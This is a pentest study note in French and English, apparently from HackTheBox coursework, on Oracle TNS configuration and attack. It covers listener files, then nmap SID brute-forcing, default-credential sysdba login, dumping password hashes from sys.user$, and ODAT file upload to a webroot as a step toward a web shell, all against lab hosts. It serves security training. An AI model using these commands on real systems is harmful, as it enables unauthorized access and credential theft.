# Oracle TNS

***

## <mark style="color:red;">**Qu'est-ce que Oracle TNS ?**</mark>

**Oracle TNS (Transparent Network Substrate)** est un protocole de communication développé par Oracle qui permet la communication entre les bases de données Oracle et les applications clientes à travers un réseau. TNS est une composante clé des Oracle Net Services, gérant les connexions entre clients et bases de données via divers protocoles réseau comme TCP/IP.

***

## <mark style="color:red;">**Caractéristiques Principales :**</mark>

* **Gestion des connexions :** Gère la manière dont les applications clientes se connectent aux bases de données Oracle.
* **Résolution des noms :** Facilite la résolution des noms de service pour se connecter à différentes instances de bases de données.
* **Sécurité :** Intègre des mécanismes de chiffrement (SSL/TLS) pour sécuriser les communications client-serveur.
* **Équilibrage de charge :** Répartit les connexions entrantes sur plusieurs serveurs pour optimiser les performances.

***

## <mark style="color:red;">**Configuration par Défaut :**</mark>

* <mark style="color:orange;">**Port par défaut :**</mark> 1521/TCP pour le listener TNS.
* <mark style="color:orange;">**Fichiers de configuration :**</mark>
  * `tnsnames.ora` : Fichier côté client contenant les configurations de connexion.
  * `listener.ora` : Fichier côté serveur définissant les paramètres du listener.
  * The configuration files for Oracle TNS are called `tnsnames.ora` and `listener.ora` and are typically located in the `$ORACLE_HOME/network/admin` directory.

<mark style="color:orange;">**Exemple de**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**`tnsnames.ora`**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**:**</mark>

<pre class="language-xeora"><code class="lang-xeora"><strong>ORCL =
</strong>  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
</code></pre>

<mark style="color:orange;">**Exemple de**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**`listener.ora`**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**:**</mark>

```txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
    )
  )
```

{% hint style="warning" %}
<mark style="color:green;">**1. Fichier**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**`tnsnames.ora`**</mark>

Le fichier `tnsnames.ora` est un fichier de configuration utilisé par le client Oracle pour résoudre les noms de services en adresses réseau. Il contient des informations sur les bases de données disponibles sur le réseau et les détails de connexion nécessaires pour que les clients Oracle puissent se connecter à ces bases de données.

**Exemple :**

```plaintext
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

**Explication détaillée :**

* **ORCL** : C'est le nom du service ou alias utilisé pour se connecter à la base de données. Lorsqu'un client Oracle se connecte, il peut spécifier "ORCL" pour se connecter à la base de données configurée sous cet alias.
* **DESCRIPTION** : Ce bloc encapsule tous les détails concernant la connexion.
* **ADDRESS\_LIST** : Ce bloc permet de définir une liste d'adresses réseau que le client Oracle peut utiliser pour se connecter à la base de données.
  * **ADDRESS** : Définit une adresse réseau spécifique où la base de données Oracle est hébergée.
    * **PROTOCOL** : Spécifie le protocole de communication utilisé. Ici, TCP est utilisé pour une connexion réseau standard.
    * **HOST** : Indique le nom d'hôte ou l'adresse IP du serveur Oracle (ici, `10.129.11.102`).
    * **PORT** : Définit le port réseau sur lequel le service Oracle écoute (ici, le port `1521`).
* **CONNECT\_DATA** : Contient les informations spécifiques à la connexion.
  * **SERVER** : Définit le type de serveur utilisé pour la connexion. `DEDICATED` signifie qu'une session dédiée est créée pour chaque connexion.
  * **SERVICE\_NAME** : Indique le nom du service de la base de données auquel le client souhaite se connecter (ici, `orcl`).

***



#### <mark style="color:green;">**2. Fichier**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**`listener.ora`**</mark>

Le fichier `listener.ora` est un fichier de configuration utilisé par le serveur Oracle pour définir les propriétés du processus de listener. Le listener est un service qui écoute les requêtes de connexion des clients sur le réseau et les redirige vers la base de données appropriée.

**Exemple :**

```plaintext
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
    )
  )
```

**Explication détaillée :**

* **SID\_LIST\_LISTENER** : Ce bloc contient la liste des bases de données ou des services que le listener gère.
  * **SID\_LIST** : Une liste de descriptions des SIDs (System Identifiers) gérés par le listener.
    * **SID\_DESC** : Décrit un SID spécifique géré par le listener.
      * **SID\_NAME** : Le nom du SID de la base de données (ici, `PDB1`), qui est un identifiant unique pour une instance Oracle.
      * **ORACLE\_HOME** : Le chemin vers l'installation d'Oracle pour cette instance spécifique (ici, `C:\oracle\product\19.0.0\dbhome_1`).
      * **GLOBAL\_DBNAME** : Le nom global de la base de données, qui est utilisé pour les connexions clients. Il peut être le même que le SID (ici, `PDB1`).
* **LISTENER** : Ce bloc définit les détails de configuration du listener lui-même.
  * **DESCRIPTION\_LIST** : Liste de descriptions de l'adresse du listener.
    * **DESCRIPTION** : Description d'une adresse spécifique où le listener est accessible.
      * **ADDRESS** : Décrit les détails de l'adresse réseau que le listener utilise pour écouter les connexions.
        * **PROTOCOL** : Le protocole utilisé par le listener (ici, `TCP`).
        * **HOST** : Le nom d'hôte ou l'adresse IP où le listener est en cours d'exécution (ici, `orcl.inlanefreight.htb`).
        * **PORT** : Le port sur lequel le listener est en écoute (ici, le port `1521`).



En résumé :

* **`tnsnames.ora`** : Configure les connexions du côté client en définissant les alias de connexion et les adresses réseau associées.
* **`listener.ora`** : Configure le listener du côté serveur, définissant les bases de données qu'il gère et les adresses réseau où il écoute les requêtes des clients.
{% endhint %}

<table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Setting</strong></td><td><strong>Description</strong></td></tr><tr><td><code>DESCRIPTION</code></td><td>A descriptor that provides a name for the database and its connection type.</td></tr><tr><td><code>ADDRESS</code></td><td>The network address of the database, which includes the hostname and port number.</td></tr><tr><td><code>PROTOCOL</code></td><td>The network protocol used for communication with the server</td></tr><tr><td><code>PORT</code></td><td>The port number used for communication with the server</td></tr><tr><td><code>CONNECT_DATA</code></td><td>Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.</td></tr><tr><td><code>INSTANCE_NAME</code></td><td>The name of the database instance the client wants to connect.</td></tr><tr><td><code>SERVICE_NAME</code></td><td>The name of the service that the client wants to connect to.</td></tr><tr><td><code>SERVER</code></td><td>The type of server used for the database connection, such as dedicated or shared.</td></tr><tr><td><code>USER</code></td><td>The username used to authenticate with the database server.</td></tr><tr><td><code>PASSWORD</code></td><td>The password used to authenticate with the database server.</td></tr><tr><td><code>SECURITY</code></td><td>The type of security for the connection.</td></tr><tr><td><code>VALIDATE_CERT</code></td><td>Whether to validate the certificate using SSL/TLS.</td></tr><tr><td><code>SSL_VERSION</code></td><td>The version of SSL/TLS to use for the connection.</td></tr><tr><td><code>CONNECT_TIMEOUT</code></td><td>The time limit in seconds for the client to establish a connection to the database.</td></tr><tr><td><code>RECEIVE_TIMEOUT</code></td><td>The time limit in seconds for the client to receive a response from the database.</td></tr><tr><td><code>SEND_TIMEOUT</code></td><td>The time limit in seconds for the client to send a request to the database.</td></tr><tr><td><code>SQLNET.EXPIRE_TIME</code></td><td>The time limit in seconds for the client to detect a connection has failed.</td></tr><tr><td><code>TRACE_LEVEL</code></td><td>The level of tracing for the database connection.</td></tr><tr><td><code>TRACE_DIRECTORY</code></td><td>The directory where the trace files are stored.</td></tr><tr><td><code>TRACE_FILE_NAME</code></td><td>The name of the trace file.</td></tr><tr><td><code>LOG_FILE</code></td><td>The file where the log information is stored.</td></tr></tbody></table>

***

## <mark style="color:red;">**Utilisation de TNS :**</mark>

* **Connexion des clients :** Les clients utilisent les informations définies dans `tnsnames.ora` pour se connecter à des services spécifiques via TNS.
* **Gestion des listeners :** Les listeners TNS sont configurés via `listener.ora` pour accepter et gérer les connexions entrantes vers les bases de données Oracle.

***

## <mark style="color:red;">**Sécurité :**</mark>

* **Chiffrement :** Support de SSL/TLS pour sécuriser les données en transit.
* **Authentification :** Vérification des hôtes autorisés et utilisation de combinaisons de nom d'utilisateur/mot de passe.
* **Fichiers de blacklist :** `PlsqlExclusionList` permet de bloquer l'exécution de certains packages PL/SQL.

***

## <mark style="color:red;">**Outils et Techniques Associés :**</mark>

* <mark style="color:orange;">**ODAT (Oracle Database Attacking Tool) :**</mark> Utilisé pour tester et exploiter les vulnérabilités des bases de données Oracle.

{% code fullWidth="true" %}
```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```
{% endcode %}

* **Nmap :** Utilisé pour scanner les ports et services TNS ainsi que pour brute-forcer les SIDs (System Identifier).

<mark style="color:green;">**Commandes utiles :**</mark>

*   **Scan du port TNS :**

    ```bash
    sudo nmap -p1521 -sV <IP>
    ```
* <mark style="color:green;">**Brute force de SID**</mark>&#x20;

{% hint style="warning" %}
Un **SID** (System Identifier) est un **nom unique qui identifie une instance spécifique d'une base de données Oracle**. Une même base de données peut avoir **plusieurs instances**, chacune ayant son propre SID.

Une **instance** correspond à un ensemble de **processus** et de **structures mémoire** qui interagissent pour gérer les données de la base. Lorsqu’un client veut se connecter à une base de données Oracle, il doit **spécifier le SID** dans la chaîne de connexion. Cela permet de **déterminer à quelle instance** de la base il veut se connecter.

Si le client **ne précise pas de SID**, Oracle utilisera par défaut celui défini dans le fichier `tnsnames.ora`.

Le **SID est donc essentiel dans le processus de connexion** : s’il est incorrect ou inexistant, la tentative de connexion échouera.

Les **administrateurs de bases de données (DBA)** peuvent utiliser le SID pour :

* Démarrer, arrêter ou redémarrer une instance spécifique
* Ajuster sa configuration (ex : mémoire)
* Surveiller ses performances (via des outils comme **Oracle Enterprise Manager**)

Il existe plusieurs méthodes pour **deviner ou énumérer les SID**, notamment avec des outils comme :

* `nmap`
* `hydra`
* `odat`
* Et d'autres encore
{% endhint %}

{% code fullWidth="true" %}
```bash
sudo nmap -p1521 --script oracle-sid-brute <IP>
./odat.py all -s 10.129.204.235
```
{% endcode %}

*   **Connexion à la base de données :**

    ```bash
    sqlplus scott/tiger@<IP>/XE
    ```

***

## <mark style="color:red;">**Oracle RDBMS - Interaction**</mark>

```shell-session
SQL> select table_name from all_tables;



SQL> select * from user_role_privs;
```

Here, the user `scott` has no administrative privileges. However, we can try using this account to log in as the System Database Admin (`sysdba`), giving us higher privileges. This is possible when the user `scott` has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.

***

## <mark style="color:red;">**Oracle RDBMS - Database Enumeration**</mark>

{% code title="" %}
```shell-session
mrroboteLiot@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba




SQL> select * from user_role_privs;

```
{% endcode %}

We can follow many approaches once we get access to an Oracle database. It highly depends on the information we have and the entire setup. However, we can not add new users or make any modifications. From this point, we could retrieve the password hashes from the `sys.user$` and try to crack them offline. The query for this would look like the following:

***

## <mark style="color:red;">**Oracle RDBMS - Extract Password Hashes**</mark>

<pre class="language-shell-session"><code class="lang-shell-session"><strong>SQL> select name, password from sys.user$;
</strong></code></pre>

Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:

| **OS**  | **Path**             |
| ------- | -------------------- |
| Linux   | `/var/www/html`      |
| Windows | `C:\inetpub\wwwroot` |

First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.

***

## <mark style="color:red;">**Oracle RDBMS - File Upload**</mark>

{% code title="" overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
mrroboteLiot@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```
{% endcode %}

* **`-s 10.129.204.235`** : Spécifie l'adresse IP du serveur Oracle.
* **`-d XE`** : Nom de la base de données Oracle à utiliser.
* **`-U scott -P tiger`** : Utilisateur et mot de passe pour se connecter à la base de données.
* **`--sysdba`** : Option pour se connecter en tant qu'utilisateur SYSDBA (administrateur).
* **`--putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt`** : Télécharge le fichier `testing.txt` depuis votre machine locale vers le répertoire `C:\inetpub\wwwroot` sur le serveur Oracle.

Finally, we can test if the file upload approach worked with `curl`. Therefore, we will use a `GET http://<IP>` request, or we can visit via browser.

```shell-session
mrroboteLiot@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt

Oracle File Upload Test
```
